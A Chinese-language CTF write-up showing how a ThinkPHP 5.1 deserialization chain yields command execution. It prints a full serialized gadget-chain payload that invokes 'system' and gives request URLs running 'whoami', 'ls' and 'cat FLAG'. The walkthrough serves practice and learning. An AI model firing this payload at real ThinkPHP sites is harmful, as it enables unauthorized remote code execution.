## ThinkPHP 反序列化利用链

访问环境时提示下载源代码 `www.zip`

![](https://pic1.imgdb.cn/item/68643d6c58cb8da5c885d046.png)

下载源代码后解压缩，通过阅读 `readme.md` 发现是 thinkphp 5.1 版本

网上搜索后，得到[利用链 thinkphp_5.1_exp.php 文件](https://github.com/Jason1314Zhang/BUUCTF-WP/blob/main/N1BOOK/scripts/thinkphp_5.1_exp.php)，只需执行 `php thinkphp_5.1_exp.php`，便可以得到 payload

关于利用链的构造网上很多大神分析了，可以看 [Thinkphp 5.1 反序列化利用链深入分析](https://paper.seebug.org/1040/)，我就不分析了，重点讲下做题

payload 内容如下：

```
O:27:"think\process\pipes\Windows":1:{s:34:"?think\process\pipes\Windows?files";a:1:{i:0;O:17:"think\model\Pivot":2:{s:9:"?*?append";a:1:{s:1:"a";a:1:{i:0;s:0:"";}}s:17:"?think\Model?data";a:1:{s:1:"a";O:13:"think\Request":3:{s:7:"?*?hook";a:1:{s:7:"visible";a:2:{i:0;r:8;i:1;s:6:"isAjax";}}s:9:"?*?filter";s:6:"system";s:9:"?*?config";a:1:{s:8:"var_ajax";s:0:"";}}}}}}
```

这里分析一下 thinkphp 的 2 个主要文件

`application\index\controller\index.php` 文件,只有请求被 hello 解析时，才能通过构造 POST 请求将 payload 赋值

给 str，实现反序列化利用

```php
<?php
namespace app\index\controller;

class Index
{
   public function index()
   {
      return "<a href='www.zip'>download code</a>";
   }

   public function hello()
   {
      unserialize($_POST['str']);
   }
}
```

`route\route.php` 文件，压缩包源代码与实际 BUUCTF 服务器代码不一样

压缩包代码如下

```php
<?php
// 当用户访问 URL 路径 /think 时
// 执行一个匿名函数（闭包）
// 函数返回字符串 'hello,ThinkPHP5!'
// 这个响应会直接返回给客户端
Route::get('think', function () {
   return 'hello,ThinkPHP5!';
});

// 当用户访问类似 /hello/John 这样的 URL 时
// :name 是一个路由参数，可以匹配任何值（这里是 "John"）
// 请求会被路由到 index 控制器的 hello 方法
// 路由参数 name 会作为参数传递给该方法
Route::get('hello/:name', 'index/hello');
return [
];
```

根据源代码构造了两种 url 请求，以 `whoami` 为例子

第一个请求路由为 `application\index\controller\index.php` 文件 -> `Index` 类 -> `hello()` 方法

```
http://{your_server}/public/index.php/index/Index/hello?a=whoami
```

![](https://pic1.imgdb.cn/item/68644be958cb8da5c885d45e.png)

第二个请求利用了 thinkphp 的[兼容模式 url](https://m.php.cn/phpkj/thinkphp/448480.html)

```
http://{your_server}/public/index.php?s=index/index/hello&a=whoami
```

![](https://pic1.imgdb.cn/item/68644c8c58cb8da5c885d48e.png)

介绍完本机命令执行，再来介绍 BUUCTF 命令执行。服务器只能用第二种请求

构造参数 `a=cd /;ls` 和 `a=cd /;cat FLAG`，`str` 的值为 1 中 payload，通过 `hackbar` 或 `burpsuite` 发包

![](https://pic1.imgdb.cn/item/68644d6458cb8da5c885d4c2.png)

![](https://pic1.imgdb.cn/item/68644d6d58cb8da5c885d4c3.png)
